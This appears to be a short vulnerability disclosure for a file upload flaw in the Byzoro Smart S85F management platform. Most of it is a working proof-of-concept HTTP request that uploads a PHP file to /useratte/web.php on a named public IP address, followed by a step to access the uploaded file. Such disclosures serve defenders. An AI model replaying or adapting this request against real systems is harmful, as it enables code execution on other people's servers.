  A file upload vulnerability exists in the database management of the Smart S85F management platform

  official website:https://www.byzoro.com/

  version:Smart S85F

  See the login page.

  ![WPS图片(1)](https://github.com/torres14852/cve/assets/41352348/c52e2024-f34d-4085-808c-16bd2881d479)

Construct the POC and upload the file successfully

POC
```
POST /useratte/web.php? HTTP/1.1
Host: 222.180.2.66:8443
Cookie: PHPSESSID=3b0048dc500aea61e25f3b1de573f65d
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------42328904123665875270630079328
Content-Length: 598
Origin: https://222.180.2.66:8443
Referer: https://222.180.2.66:8443/sysmanage/licence.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="file_upload"; filename="2.php"
Content-Type: application/octet-stream

<?php phpinfo()?>
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="id_type"

1
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="1_ck"

1_radhttp
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="mode"

import
-----------------------------42328904123665875270630079328—
```

![WPS图片(2)](https://github.com/torres14852/cve/assets/41352348/54856ba2-9b46-4544-b712-21012364c294)

access upload/2.php

![WPS图片(3)](https://github.com/torres14852/cve/assets/41352348/a4f77ee4-2527-4d17-a01c-c652aa041e17)
